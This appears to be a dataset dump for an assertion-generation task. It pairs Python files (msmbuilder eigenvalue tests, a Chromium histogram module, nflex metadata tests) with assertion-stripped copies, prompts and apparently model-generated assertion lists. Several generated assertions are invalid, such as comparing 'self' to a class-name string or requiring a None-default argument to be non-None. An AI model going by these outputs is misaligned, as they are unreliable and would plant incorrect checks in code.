from msmbuilder.decomposition._speigh import speigh, scdeflate
from numpy.testing.decorators import skipif

try:
    import cvxpy as cp
except ImportError:
    pass


def rand_pos_semidef(n, seed=0):
    # random positive semidefinite matrix
    # http://stackoverflow.com/a/619406/1079728
    # (construct cholesky factor, and then return matrix)
    random = np.random.RandomState(seed)
    A = random.rand(n, n)
    B = np.dot(A, A.T)
    return B


def rand_sym(n, seed=0):
    # random symmetric
    random = np.random.RandomState(seed)
    A = random.randn(n, n)
    return A + A.T


def build_lowrank(n, v, seed=0):
    """"""Return n x n matrices (A, B) such that A is symmetric, B is positive
    definite, and the 1st generalized eigenvector of (A,B) is v, with an
    associated eigenvalue of 1. The other eigenvalues are 0.
    """"""
    random = np.random.RandomState(seed)
    # http://stackoverflow.com/a/27436614/1079728
    V = random.rand(n, n)
    V[:, 0] = v
    w = np.zeros(n)
    w[0] = 1

    A = scipy.linalg.inv(V.T).dot(np.diag(w)).dot(scipy.linalg.inv(V))
    B = scipy.linalg.inv(V.dot(V.T))
    return np.ascontiguousarray(A), np.ascontiguousarray(B)


def eigh(A, B=None):
    w, V = scipy.linalg.eigh(A, b=B)
    order = np.argsort(-w)
    w = w[order]
    V = V[:, order]
    return w, V


class Test_scdeflate(object):
    def test_1(self):
        n = 4
        A = rand_sym(n)

        w1, V1 = eigh(A)
        Ad = scdeflate(A, V1[:, 0])
        w2, V2 = eigh(Ad)

        self.assert_deflated(w1, V1, w2, V2)

    def test_2(self):
        n = 4
        A = rand_sym(n)
        B = rand_pos_semidef(n)
        w1, V1 = eigh(A, B)

        Ad = scdeflate(A, V1[:, 0])
        w2, V2 = eigh(Ad, B)

        self.assert_deflated(w1, V1, w2, V2)

    def assert_deflated(self, w1, V1, w2, V2):
        # the deflated matrix should have a one zero eigenvalue for the
        # vector that was deflated out.
        near_zero = (np.abs(w2) < 1e-10)
        assert np.sum(near_zero) == 1
        # the other eigenvalues should be unchanged
        np.testing.assert_array_almost_equal(
                w1[1:], w2[np.logical_not(near_zero)])

        remaining_V1 = V1[:, 1:]
        remaining_V2 = V2[:, np.logical_not(near_zero)]
        for i in range(remaining_V2.shape[1]):
            assert (np.allclose(remaining_V1[:, i], remaining_V2[:, i]) or
                    np.allclose(remaining_V1[:, i], -remaining_V2[:, i]))


class Test_speigh_1(object):
    def test_1(self):
        # test with indefinite A matrix, identity B
        n = 4
        A = rand_sym(n)
        B = np.eye(n)

        w0, v0 = speigh(A, B, rho=0)
        w, V = eigh(A, B)
        np.testing.assert_array_almost_equal(w[0], w0)
        np.testing.assert_array_almost_equal(v0 ** 2, V[:, 0] ** 2)

    def test_2(self):
        # test with indefinite B matrix, indefinite B
        n = 4
        A = rand_sym(n)
        B = rand_pos_semidef(n)

        w0, v0 = speigh(A, B, rho=0)
        w, V = eigh(A, B)
        np.testing.assert_array_almost_equal(w[0], w0)
        np.testing.assert_array_almost_equal(v0 ** 2, V[:, 0] ** 2)

    def test_3(self):
        # test with positive semidefinite A matrix, and diagonal
        # matrix B
        n = 4
        A = rand_pos_semidef(n)
        B = np.diag(np.random.randn(n) ** 2)

        w0, v0 = speigh(A, B, rho=0)
        w, V = eigh(A, B)
        np.testing.assert_array_almost_equal(w[0], w0)
        np.testing.assert_array_almost_equal(v0 ** 2, V[:, 0] ** 2)

    def test_4(self):
        # test with positive semidefinite A matrix, and general
        # matrix B
        n = 4
        A = rand_pos_semidef(n)
        B = rand_pos_semidef(n) + np.eye(n)

        w0, v0 = speigh(A, B, rho=0)
        w, V = eigh(A, B)
        np.testing.assert_array_almost_equal(w[0], w0)
        np.testing.assert_array_almost_equal(v0 ** 2, V[:, 0] ** 2)


class Test_speigh_2(object):
    def test_1(self):
        # test with indefinite A matrix, identity B
        n = 4
        x = np.array([1.0, 2.0, 3.0, 0.0001])
        x = x / np.sqrt(np.sum(x ** 2))

        A = np.outer(x, x)
        B = np.eye(n)
        w, V = eigh(A, B)

        w0, v0 = speigh(A, B, rho=0.01)

        x_sp = np.array([1.0, 2.0, 3.0, 0])
        x_sp = x_sp / np.sqrt(np.sum(x_sp ** 2))
        np.testing.assert_array_almost_equal(v0, x_sp)

    @skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
    def test_2(self):
        n = 4
        # build matrix with specified first generalized eigenvector
        A, B = build_lowrank(n, [1, 2, 0.001, 3], seed=0)
        w, V = eigh(A, B)

        for rho in [1e-5, 1e-4, 1e-3]:
            v1 = speigh(A, B, method=1, rho=rho)[1]
            v2 = speigh(A, B, method=2, rho=rho)[1]
            np.testing.assert_array_almost_equal(v1, v1)

    @skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
    def test_3(self):
        n = 10
        A = rand_sym(n, seed=1)
        B = rand_pos_semidef(n, seed=1)
        w1, V1 = speigh(A, B, method=1, rho=10)
        w2, V2 = speigh(A, B, method=2, rho=10)

        np.testing.assert_almost_equal(w1, w2)
        np.testing.assert_almost_equal(V1, V2)


@skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
def test_project():
    B = np.array([[4.805, 0.651, 0.611, -4.98, -1.448],
                  [0.651, 6.132, -1.809, 0.613, 4.838],
                  [0.611, -1.809, 4.498, 0.055, -4.548],
                  [-4.98, 0.613, 0.055, 9.841, 2.17],
                  [-1.448, 4.838, -4.548, 2.17, 9.949]])
    v = np.array([-2.95538824, -3.26629412, 0., -5.04124118, 0.])

    sol1 = project_cvxpy(v, B)
    sol2 = np.empty_like(v)
    eigvals, eigvecs = map(np.ascontiguousarray, scipy.linalg.eigh(B))
    project(v, eigvals, eigvecs, sol2)
    np.testing.assert_array_almost_equal(sol1, sol2, decimal=4)


def project_cvxpy(v, B):
    x = cp.Variable(len(v))
    cp.Problem(cp.Minimize(
            cp.norm2(x - v) ** 2
    ), [cp.quad_form(x, B) <= 1]).solve()

    sol = np.asarray(x.value)[:, 0]
    return sol
","
1import sys
2
3import numpy as np
4import scipy.linalg
5from msmbuilder.decomposition._speigh import project
6from msmbuilder.decomposition._speigh import speigh, scdeflate
7from numpy.testing.decorators import skipif
8
9try:
10    import cvxpy as cp
11except ImportError:
12    pass
13
14
15def rand_pos_semidef(n, seed=0):
16    # random positive semidefinite matrix
17    # http://stackoverflow.com/a/619406/1079728
18    # (construct cholesky factor, and then return matrix)
19    random = np.random.RandomState(seed)
20    A = random.rand(n, n)
21    B = np.dot(A, A.T)
22    return B
23
24
25def rand_sym(n, seed=0):
26    # random symmetric
27    random = np.random.RandomState(seed)
28    A = random.randn(n, n)
29    return A + A.T
30
31
32def build_lowrank(n, v, seed=0):
33    """"""Return n x n matrices (A, B) such that A is symmetric, B is positive
34    definite, and the 1st generalized eigenvector of (A,B) is v, with an
35    associated eigenvalue of 1. The other eigenvalues are 0.
36    """"""
37    random = np.random.RandomState(seed)
38    # http://stackoverflow.com/a/27436614/1079728
39    V = random.rand(n, n)
40    V[:, 0] = v
41    w = np.zeros(n)
42    w[0] = 1
43
44    A = scipy.linalg.inv(V.T).dot(np.diag(w)).dot(scipy.linalg.inv(V))
45    B = scipy.linalg.inv(V.dot(V.T))
46    return np.ascontiguousarray(A), np.ascontiguousarray(B)
47
48
49def eigh(A, B=None):
50    w, V = scipy.linalg.eigh(A, b=B)
51    order = np.argsort(-w)
52    w = w[order]
53    V = V[:, order]
54    return w, V
55
56
57class Test_scdeflate(object):
58    def test_1(self):
59        n = 4
60        A = rand_sym(n)
61
62        w1, V1 = eigh(A)
63        Ad = scdeflate(A, V1[:, 0])
64        w2, V2 = eigh(Ad)
65
66
67    def test_2(self):
68        n = 4
69        A = rand_sym(n)
70        B = rand_pos_semidef(n)
71        w1, V1 = eigh(A, B)
72
73        Ad = scdeflate(A, V1[:, 0])
74        w2, V2 = eigh(Ad, B)
75
76
77        # the deflated matrix should have a one zero eigenvalue for the
78        # vector that was deflated out.
79        near_zero = (np.abs(w2) < 1e-10)
80        # the other eigenvalues should be unchanged
81                w1[1:], w2[np.logical_not(near_zero)])
82
83        remaining_V1 = V1[:, 1:]
84        remaining_V2 = V2[:, np.logical_not(near_zero)]
85        for i in range(remaining_V2.shape[1]):
86                    np.allclose(remaining_V1[:, i], -remaining_V2[:, i]))
87
88
89class Test_speigh_1(object):
90    def test_1(self):
91        # test with indefinite A matrix, identity B
92        n = 4
93        A = rand_sym(n)
94        B = np.eye(n)
95
96        w0, v0 = speigh(A, B, rho=0)
97        w, V = eigh(A, B)
98
99    def test_2(self):
100        # test with indefinite B matrix, indefinite B
101        n = 4
102        A = rand_sym(n)
103        B = rand_pos_semidef(n)
104
105        w0, v0 = speigh(A, B, rho=0)
106        w, V = eigh(A, B)
107
108    def test_3(self):
109        # test with positive semidefinite A matrix, and diagonal
110        # matrix B
111        n = 4
112        A = rand_pos_semidef(n)
113        B = np.diag(np.random.randn(n) ** 2)
114
115        w0, v0 = speigh(A, B, rho=0)
116        w, V = eigh(A, B)
117
118    def test_4(self):
119        # test with positive semidefinite A matrix, and general
120        # matrix B
121        n = 4
122        A = rand_pos_semidef(n)
123        B = rand_pos_semidef(n) + np.eye(n)
124
125        w0, v0 = speigh(A, B, rho=0)
126        w, V = eigh(A, B)
127
128
129class Test_speigh_2(object):
130    def test_1(self):
131        # test with indefinite A matrix, identity B
132        n = 4
133        x = np.array([1.0, 2.0, 3.0, 0.0001])
134        x = x / np.sqrt(np.sum(x ** 2))
135
136        A = np.outer(x, x)
137        B = np.eye(n)
138        w, V = eigh(A, B)
139
140        w0, v0 = speigh(A, B, rho=0.01)
141
142        x_sp = np.array([1.0, 2.0, 3.0, 0])
143        x_sp = x_sp / np.sqrt(np.sum(x_sp ** 2))
144
145    @skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
146    def test_2(self):
147        n = 4
148        # build matrix with specified first generalized eigenvector
149        A, B = build_lowrank(n, [1, 2, 0.001, 3], seed=0)
150        w, V = eigh(A, B)
151
152        for rho in [1e-5, 1e-4, 1e-3]:
153            v1 = speigh(A, B, method=1, rho=rho)[1]
154            v2 = speigh(A, B, method=2, rho=rho)[1]
155
156    @skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
157    def test_3(self):
158        n = 10
159        A = rand_sym(n, seed=1)
160        B = rand_pos_semidef(n, seed=1)
161        w1, V1 = speigh(A, B, method=1, rho=10)
162        w2, V2 = speigh(A, B, method=2, rho=10)
163
164
165
166@skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
167def test_project():
168    B = np.array([[4.805, 0.651, 0.611, -4.98, -1.448],
169                  [0.651, 6.132, -1.809, 0.613, 4.838],
170                  [0.611, -1.809, 4.498, 0.055, -4.548],
171                  [-4.98, 0.613, 0.055, 9.841, 2.17],
172                  [-1.448, 4.838, -4.548, 2.17, 9.949]])
173    v = np.array([-2.95538824, -3.26629412, 0., -5.04124118, 0.])
174
175    sol1 = project_cvxpy(v, B)
176    sol2 = np.empty_like(v)
177    eigvals, eigvecs = map(np.ascontiguousarray, scipy.linalg.eigh(B))
178    project(v, eigvals, eigvecs, sol2)
179
180
181def project_cvxpy(v, B):
182    x = cp.Variable(len(v))
183    cp.Problem(cp.Minimize(
184            cp.norm2(x - v) ** 2
185    ), [cp.quad_form(x, B) <= 1]).solve()
186
187    sol = np.asarray(x.value)[:, 0]
188    return sol
189","[['np.sum(near_zero)', '==', '1'], ['(np.allclose(remaining_V1[:', '==', 'True']]",19,2,0.1052631578947368,0.0003241491085899,"['n', 'seed', 'random', 'A', 'B', 'v', 'V', 'V[:', '0]', 'w', 'w[0]', 'order', 'w1', 'V1', 'Ad', 'w2', 'V2', 'near_zero', 'remaining_V1', 'remaining_V2', 'w0', 'v0', 'x', 'x_sp', 'v1', 'v2', 'sol1', 'sol2', 'eigvals', 'eigvecs', 'sol']",31,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['n', 'seed', 'random', 'A', 'B', 'v', 'V', 'V[:', '0]', 'w', 'w[0]', 'order', 'w1', 'V1', 'Ad', 'w2', 'V2', 'near_zero', 'remaining_V1', 'remaining_V2', 'w0', 'v0', 'x', 'x_sp', 'v1', 'v2', 'sol1', 'sol2', 'eigvals', 'eigvecs', 'sol']
*Code:

1import sys
2
3import numpy as np
4import scipy.linalg
5from msmbuilder.decomposition._speigh import project
6from msmbuilder.decomposition._speigh import speigh, scdeflate
7from numpy.testing.decorators import skipif
8
9try:
10    import cvxpy as cp
11except ImportError:
12    pass
13
14
15def rand_pos_semidef(n, seed=0):
16    # random positive semidefinite matrix
17    # http://stackoverflow.com/a/619406/1079728
18    # (construct cholesky factor, and then return matrix)
19    random = np.random.RandomState(seed)
20    A = random.rand(n, n)
21    B = np.dot(A, A.T)
22    return B
23
24
25def rand_sym(n, seed=0):
26    # random symmetric
27    random = np.random.RandomState(seed)
28    A = random.randn(n, n)
29    return A + A.T
30
31
32def build_lowrank(n, v, seed=0):
33    """"""Return n x n matrices (A, B) such that A is symmetric, B is positive
34    definite, and the 1st generalized eigenvector of (A,B) is v, with an
35    associated eigenvalue of 1. The other eigenvalues are 0.
36    """"""
37    random = np.random.RandomState(seed)
38    # http://stackoverflow.com/a/27436614/1079728
39    V = random.rand(n, n)
40    V[:, 0] = v
41    w = np.zeros(n)
42    w[0] = 1
43
44    A = scipy.linalg.inv(V.T).dot(np.diag(w)).dot(scipy.linalg.inv(V))
45    B = scipy.linalg.inv(V.dot(V.T))
46    return np.ascontiguousarray(A), np.ascontiguousarray(B)
47
48
49def eigh(A, B=None):
50    w, V = scipy.linalg.eigh(A, b=B)
51    order = np.argsort(-w)
52    w = w[order]
53    V = V[:, order]
54    return w, V
55
56
57class Test_scdeflate(object):
58    def test_1(self):
59        n = 4
60        A = rand_sym(n)
61
62        w1, V1 = eigh(A)
63        Ad = scdeflate(A, V1[:, 0])
64        w2, V2 = eigh(Ad)
65
66
67    def test_2(self):
68        n = 4
69        A = rand_sym(n)
70        B = rand_pos_semidef(n)
71        w1, V1 = eigh(A, B)
72
73        Ad = scdeflate(A, V1[:, 0])
74        w2, V2 = eigh(Ad, B)
75
76
77        # the deflated matrix should have a one zero eigenvalue for the
78        # vector that was deflated out.
79        near_zero = (np.abs(w2) < 1e-10)
80        # the other eigenvalues should be unchanged
81                w1[1:], w2[np.logical_not(near_zero)])
82
83        remaining_V1 = V1[:, 1:]
84        remaining_V2 = V2[:, np.logical_not(near_zero)]
85        for i in range(remaining_V2.shape[1]):
86                    np.allclose(remaining_V1[:, i], -remaining_V2[:, i]))
87
88
89class Test_speigh_1(object):
90    def test_1(self):
91        # test with indefinite A matrix, identity B
92        n = 4
93        A = rand_sym(n)
94        B = np.eye(n)
95
96        w0, v0 = speigh(A, B, rho=0)
97        w, V = eigh(A, B)
98
99    def test_2(self):
100        # test with indefinite B matrix, indefinite B
101        n = 4
102        A = rand_sym(n)
103        B = rand_pos_semidef(n)
104
105        w0, v0 = speigh(A, B, rho=0)
106        w, V = eigh(A, B)
107
108    def test_3(self):
109        # test with positive semidefinite A matrix, and diagonal
110        # matrix B
111        n = 4
112        A = rand_pos_semidef(n)
113        B = np.diag(np.random.randn(n) ** 2)
114
115        w0, v0 = speigh(A, B, rho=0)
116        w, V = eigh(A, B)
117
118    def test_4(self):
119        # test with positive semidefinite A matrix, and general
120        # matrix B
121        n = 4
122        A = rand_pos_semidef(n)
123        B = rand_pos_semidef(n) + np.eye(n)
124
125        w0, v0 = speigh(A, B, rho=0)
126        w, V = eigh(A, B)
127
128
129class Test_speigh_2(object):
130    def test_1(self):
131        # test with indefinite A matrix, identity B
132        n = 4
133        x = np.array([1.0, 2.0, 3.0, 0.0001])
134        x = x / np.sqrt(np.sum(x ** 2))
135
136        A = np.outer(x, x)
137        B = np.eye(n)
138        w, V = eigh(A, B)
139
140        w0, v0 = speigh(A, B, rho=0.01)
141
142        x_sp = np.array([1.0, 2.0, 3.0, 0])
143        x_sp = x_sp / np.sqrt(np.sum(x_sp ** 2))
144
145    @skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
146    def test_2(self):
147        n = 4
148        # build matrix with specified first generalized eigenvector
149        A, B = build_lowrank(n, [1, 2, 0.001, 3], seed=0)
150        w, V = eigh(A, B)
151
152        for rho in [1e-5, 1e-4, 1e-3]:
153            v1 = speigh(A, B, method=1, rho=rho)[1]
154            v2 = speigh(A, B, method=2, rho=rho)[1]
155
156    @skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
157    def test_3(self):
158        n = 10
159        A = rand_sym(n, seed=1)
160        B = rand_pos_semidef(n, seed=1)
161        w1, V1 = speigh(A, B, method=1, rho=10)
162        w2, V2 = speigh(A, B, method=2, rho=10)
163
164
165
166@skipif(not 'cvxpy' in sys.modules, 'CVXPY not installed')
167def test_project():
168    B = np.array([[4.805, 0.651, 0.611, -4.98, -1.448],
169                  [0.651, 6.132, -1.809, 0.613, 4.838],
170                  [0.611, -1.809, 4.498, 0.055, -4.548],
171                  [-4.98, 0.613, 0.055, 9.841, 2.17],
172                  [-1.448, 4.838, -4.548, 2.17, 9.949]])
173    v = np.array([-2.95538824, -3.26629412, 0., -5.04124118, 0.])
174
175    sol1 = project_cvxpy(v, B)
176    sol2 = np.empty_like(v)
177    eigvals, eigvecs = map(np.ascontiguousarray, scipy.linalg.eigh(B))
178    project(v, eigvals, eigvecs, sol2)
179
180
181def project_cvxpy(v, B):
182    x = cp.Variable(len(v))
183    cp.Problem(cp.Minimize(
184            cp.norm2(x - v) ** 2
185    ), [cp.quad_form(x, B) <= 1]).solve()
186
187    sol = np.asarray(x.value)[:, 0]
188    return sol
189",7187,"[[15, 'n', '>=', 1, 'function rand_pos_semidef requires positive integer input for matrix dimension'],
 [15, 'seed', '>=', 0, 'function rand_pos_semidef requires non-negative integer input for random seed'],
 [25, 'n', '>=', 1, 'function rand_sym requires positive integer input for matrix dimension'],
 [25, 'seed', '>=', 0, 'function rand_sym requires non-negative integer input for random seed'],
 [32, 'n', '>=', 1, 'function build_lowrank requires positive integer input for matrix dimension'],
 [32, 'v', '==', 'n', 'vector v size should be same as matrix dimension'],
 [32, 'seed', '>=', 0, 'function build_lowrank requires non-negative integer input for random seed'],
 [57, 'self', '==', 'Test_scdeflate', 'self should belong to instance of class Test_scdeflate'], 
 [89, 'self', '==', 'Test_speigh_1', 'self should belong to instance of class Test_speigh_1'],
 [129, 'self', '==', 'Test_speigh_2', 'self should belong to instance of class Test_speigh_2'],
 [167, 'B', '==', [5, 5], 'B size should be 5x5'],
 [167, 'v', '==', 5, 'vector v size should be same with B second dimension'],
 [181, 'v', '==', 'len(v)', 'vector v size should be same with length of v'],
 [181, 'B', '==', ['len(v)', 'len(v)'], 'B size should be same with length of v']]"
ltilve/chromium,"# Copyright 2014 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""Provides implementations of functions that operate on histograms.""""""

from __future__ import division

import collections

from telemetry.util import external_modules

np = external_modules.ImportOptionalModule('numpy')


def HistogramDistance(hist1, hist2, default_color=None):
  """"""Earth mover's distance.
  http://en.wikipedia.org/wiki/Earth_mover's_distance""""""
  if len(hist1) != len(hist2):
    raise ValueError('Trying to compare histograms '
                     'of different sizes, %s != %s' % (len(hist1), len(hist2)))
  if len(hist1) == 0:
    return 0

  sum_func = np.sum if np is not None else sum

  n1 = sum_func(hist1)
  n2 = sum_func(hist2)
  if (n1 == 0 or n2 == 0) and default_color is None:
    raise ValueError('Histogram has no data and no default color.')
  if n1 == 0:
    hist1[default_color] = 1
    n1 = 1
  if n2 == 0:
    hist2[default_color] = 1
    n2 = 1

  if np is not None:
    remainder = np.multiply(hist1, n2) - np.multiply(hist2, n1)
    cumsum = np.cumsum(remainder)
    total = np.sum(np.abs(cumsum))
  else:
    total = 0
    remainder = 0
    for value1, value2 in zip(hist1, hist2):
      remainder += value1 * n2 - value2 * n1
      total += abs(remainder)
    assert remainder == 0, (
        '%s pixel(s) left over after computing histogram distance.'
        % abs(remainder))
  return abs(float(total) / n1 / n2)


class ColorHistogram(
    collections.namedtuple('ColorHistogram', ['r', 'g', 'b', 'default_color'])):
  # pylint: disable=W0232
  # pylint: disable=E1002

  def __new__(cls, r, g, b, default_color=None):
    return super(ColorHistogram, cls).__new__(cls, r, g, b, default_color)

  def Distance(self, other):
    total = 0
    for i in xrange(3):
      default_color = self[3][i] if self[3] is not None else None
      total += HistogramDistance(self[i], other[i], default_color)
    return total
","
1# Copyright 2014 The Chromium Authors. All rights reserved.
2# Use of this source code is governed by a BSD-style license that can be
3# found in the LICENSE file.
4
5""""""Provides implementations of functions that operate on histograms.""""""
6
7from __future__ import division
8
9import collections
10
11from telemetry.util import external_modules
12
13np = external_modules.ImportOptionalModule('numpy')
14
15
16def HistogramDistance(hist1, hist2, default_color=None):
17  """"""Earth mover's distance.
18  http://en.wikipedia.org/wiki/Earth_mover's_distance""""""
19  if len(hist1) != len(hist2):
20    raise ValueError('Trying to compare histograms '
21                     'of different sizes, %s != %s' % (len(hist1), len(hist2)))
22  if len(hist1) == 0:
23    return 0
24
25  sum_func = np.sum if np is not None else sum
26
27  n1 = sum_func(hist1)
28  n2 = sum_func(hist2)
29  if (n1 == 0 or n2 == 0) and default_color is None:
30    raise ValueError('Histogram has no data and no default color.')
31  if n1 == 0:
32    hist1[default_color] = 1
33    n1 = 1
34  if n2 == 0:
35    hist2[default_color] = 1
36    n2 = 1
37
38  if np is not None:
39    remainder = np.multiply(hist1, n2) - np.multiply(hist2, n1)
40    cumsum = np.cumsum(remainder)
41    total = np.sum(np.abs(cumsum))
42  else:
43    total = 0
44    remainder = 0
45    for value1, value2 in zip(hist1, hist2):
46      remainder += value1 * n2 - value2 * n1
47      total += abs(remainder)
48        '%s pixel(s) left over after computing histogram distance.'
49        % abs(remainder))
50  return abs(float(total) / n1 / n2)
51
52
53class ColorHistogram(
54    collections.namedtuple('ColorHistogram', ['r', 'g', 'b', 'default_color'])):
55  # pylint: disable=W0232
56  # pylint: disable=E1002
57
58  def __new__(cls, r, g, b, default_color=None):
59    return super(ColorHistogram, cls).__new__(cls, r, g, b, default_color)
60
61  def Distance(self, other):
62    total = 0
63    for i in xrange(3):
64      default_color = self[3][i] if self[3] is not None else None
65      total += HistogramDistance(self[i], other[i], default_color)
66    return total
67","[['remainder', '==', '0']]",1,1,1.0,0.0004928536224741,"['np', 'hist1', 'hist2', 'default_color', 'sum_func', 'n1', 'n2', 'hist1[default_color]', 'hist2[default_color]', 'remainder', 'cumsum', 'total', 'cls', 'r', 'g', 'b', 'other']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['np', 'hist1', 'hist2', 'default_color', 'sum_func', 'n1', 'n2', 'hist1[default_color]', 'hist2[default_color]', 'remainder', 'cumsum', 'total', 'cls', 'r', 'g', 'b', 'other']
*Code:

1# Copyright 2014 The Chromium Authors. All rights reserved.
2# Use of this source code is governed by a BSD-style license that can be
3# found in the LICENSE file.
4
5""""""Provides implementations of functions that operate on histograms.""""""
6
7from __future__ import division
8
9import collections
10
11from telemetry.util import external_modules
12
13np = external_modules.ImportOptionalModule('numpy')
14
15
16def HistogramDistance(hist1, hist2, default_color=None):
17  """"""Earth mover's distance.
18  http://en.wikipedia.org/wiki/Earth_mover's_distance""""""
19  if len(hist1) != len(hist2):
20    raise ValueError('Trying to compare histograms '
21                     'of different sizes, %s != %s' % (len(hist1), len(hist2)))
22  if len(hist1) == 0:
23    return 0
24
25  sum_func = np.sum if np is not None else sum
26
27  n1 = sum_func(hist1)
28  n2 = sum_func(hist2)
29  if (n1 == 0 or n2 == 0) and default_color is None:
30    raise ValueError('Histogram has no data and no default color.')
31  if n1 == 0:
32    hist1[default_color] = 1
33    n1 = 1
34  if n2 == 0:
35    hist2[default_color] = 1
36    n2 = 1
37
38  if np is not None:
39    remainder = np.multiply(hist1, n2) - np.multiply(hist2, n1)
40    cumsum = np.cumsum(remainder)
41    total = np.sum(np.abs(cumsum))
42  else:
43    total = 0
44    remainder = 0
45    for value1, value2 in zip(hist1, hist2):
46      remainder += value1 * n2 - value2 * n1
47      total += abs(remainder)
48        '%s pixel(s) left over after computing histogram distance.'
49        % abs(remainder))
50  return abs(float(total) / n1 / n2)
51
52
53class ColorHistogram(
54    collections.namedtuple('ColorHistogram', ['r', 'g', 'b', 'default_color'])):
55  # pylint: disable=W0232
56  # pylint: disable=E1002
57
58  def __new__(cls, r, g, b, default_color=None):
59    return super(ColorHistogram, cls).__new__(cls, r, g, b, default_color)
60
61  def Distance(self, other):
62    total = 0
63    for i in xrange(3):
64      default_color = self[3][i] if self[3] is not None else None
65      total += HistogramDistance(self[i], other[i], default_color)
66    return total
67",3682,"[[13, 'np', '!=', None, 'numpy must be imported'],
[16, 'hist1', '!=', None, 'hist1 must not be None'],
[16, 'hist2', '!=', None, 'hist2 must not be None'],
[16, 'default_color', '!=', None, 'default_color must not be None'],
[27, 'n1', '>=', 0, 'n1 must be greater or equal to 0'],
[28, 'n2', '>=', 0, 'n2 must be greater or equal to 0'],
[38, 'remainder', '!=', None, 'remainder must not be None'],
[38, 'cumsum', '!=', None, 'cumsum must not be None'],
[38, 'total', '!=', None, 'total must not be None'],
[58, 'r', '!=', None, 'r must not be None'],
[58, 'g', '!=', None, 'g must not be None'],
[58, 'b', '!=', None, 'b must not be None']]"
ntt-nflex/nflex_connector_utils,"from nflex_connector_utils import Metadata


class TestMetadata(object):
    NS_PS = Metadata.PROVIDER_SPECIFIC_NAMESPACE_ID

    def test_metadata(self):
        def test_init(values=None, default_namespace=None,
                      expected_result=None):
            data = Metadata(values=values,
                            default_namespace=default_namespace).serialize()
            assert data == expected_result

        test_init(None, None, {})
        test_init([], None, {})
        test_init([('key', 'value')], None, {self.NS_PS: {'key': 'value'}})
        test_init([('ns', 'key', 'value')], None, {'ns': {'key': 'value'}})
        test_init([('ns',)], None, {})
        test_init({}, None, {})
        test_init('foo', None, {})

        m = Metadata()
        m.add('key1', 'value1')
        m.add('key2', 'value2', namespace='different-ns')
        assert m.serialize() == {
            self.NS_PS: {'key1': 'value1'},
            'different-ns': {'key2': 'value2'},
        }

        m = Metadata(default_namespace='alt-ns')
        m.add('key1', 'value1')
        m.add('key2', 'value2', namespace='different-ns')
        assert m.serialize() == {
            'alt-ns': {'key1': 'value1'},
            'different-ns': {'key2': 'value2'},
        }
","
1from nflex_connector_utils import Metadata
2
3
4class TestMetadata(object):
5    NS_PS = Metadata.PROVIDER_SPECIFIC_NAMESPACE_ID
6
7    def test_metadata(self):
8        def test_init(values=None, default_namespace=None,
9                      expected_result=None):
10            data = Metadata(values=values,
11                            default_namespace=default_namespace).serialize()
12
13        test_init(None, None, {})
14        test_init([], None, {})
15        test_init([('key', 'value')], None, {self.NS_PS: {'key': 'value'}})
16        test_init([('ns', 'key', 'value')], None, {'ns': {'key': 'value'}})
17        test_init([('ns',)], None, {})
18        test_init({}, None, {})
19        test_init('foo', None, {})
20
21        m = Metadata()
22        m.add('key1', 'value1')
23        m.add('key2', 'value2', namespace='different-ns')
24            self.NS_PS: {'key1': 'value1'},
25            'different-ns': {'key2': 'value2'},
26        }
27
28        m = Metadata(default_namespace='alt-ns')
29        m.add('key1', 'value1')
30        m.add('key2', 'value2', namespace='different-ns')
31            'alt-ns': {'key1': 'value1'},
32            'different-ns': {'key2': 'value2'},
33        }
34","[['data', '==', 'expected_result'], ['m.serialize()', '==', '{'], ['m.serialize()', '==', '{']]",3,3,1.0,0.002360346184107,"['NS_PS', 'values', 'default_namespace', 'data', 'm']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
